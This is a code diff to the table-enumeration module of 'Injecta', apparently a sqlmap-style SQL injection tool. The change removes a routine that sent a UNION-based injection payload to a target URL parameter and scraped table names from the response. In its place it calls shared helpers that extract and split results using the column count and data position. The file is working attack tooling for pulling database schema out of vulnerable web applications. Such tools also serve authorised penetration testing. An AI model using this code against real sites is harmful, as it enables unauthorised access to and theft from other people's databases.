@@ -1,7 +1,8 @@
 """
-Injecta — Table enumeration
+Injecta — Table enumeration (sqlmap-style extraction)
 """
-from typing import Any, Dict, List, Optional
+from typing import Any, Dict, List
+from injecta.enum.extract import extract_clean, split_groupped
 
 
 class TableEnumerator:
@@ -11,30 +12,19 @@ class TableEnumerator:
         self.log = logger
         self.payloads = payloads
         self.info = injection_info
+        self.dbms = getattr(payloads, "name", "") if payloads else ""
 
     def enumerate(self, url: str, param: str, db: str) -> List[str]:
         tables = []
         queries = self.payloads.tables(db)
+        cols = self.info.get("column_count", 1)
+        pos = self.info.get("data_pos", 1)
 
         for q in queries:
-            results = self._try_extract(url, param, q)
+            results = extract_clean(self.req, url, param, q, cols, pos, self.dbms)
             if results:
-                tables.extend(results)
+                for r in results:
+                    tables.extend(split_groupped(r))
                 break
 
         return list(set(tables))
-
-    def _try_extract(self, url: str, param: str, sql: str) -> List[str]:
-        results = []
-        payload = f"' UNION {sql}-- -"
-        _, resp_text, _ = self.req.test_raw(url, payload, param)
-        if resp_text and len(resp_text) > 100:
-            import re
-            candidates = re.findall(r'(\w[\w$#@.-]+)', resp_text)
-            if candidates:
-                skip = {'select', 'from', 'where', 'and', 'or', 'null', 'as', 'on', 'union',
-                        'table_name', 'column_name', 'information_schema', 'table_schema',
-                        'table_catalog', 'table_type', 'is_updatable'}
-                results = [c for c in candidates if len(c) > 1 and not c.isdigit()
-                          and c.lower() not in skip][:30]
-        return results
